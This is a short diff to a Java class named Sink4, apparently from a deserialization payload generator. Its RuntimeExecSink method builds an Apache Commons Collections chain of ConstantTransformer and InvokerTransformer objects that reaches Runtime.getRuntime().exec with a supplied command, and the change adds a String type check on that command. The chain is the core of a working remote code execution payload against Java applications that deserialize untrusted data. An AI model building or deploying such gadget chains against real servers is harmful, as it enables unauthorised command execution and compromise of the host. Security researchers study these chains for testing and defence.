@@ -19,12 +19,20 @@ import java.util.List;
 
 
 public class Sink4 {
-    public static SinkResult RuntimeExecSink(String command) throws Exception {
+    public static SinkResult RuntimeExecSink(Object command) throws Exception {
+        String realCommand;
+        if (command instanceof String) {
+            realCommand = (String) command;
+        } else {
+            throw new IllegalArgumentException("[command]: Can't use " + command.getClass() + " as command");
+        }
+
+
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{realCommand}),
         };
         Transformer transformer = new ChainedTransformer(transformers);
 
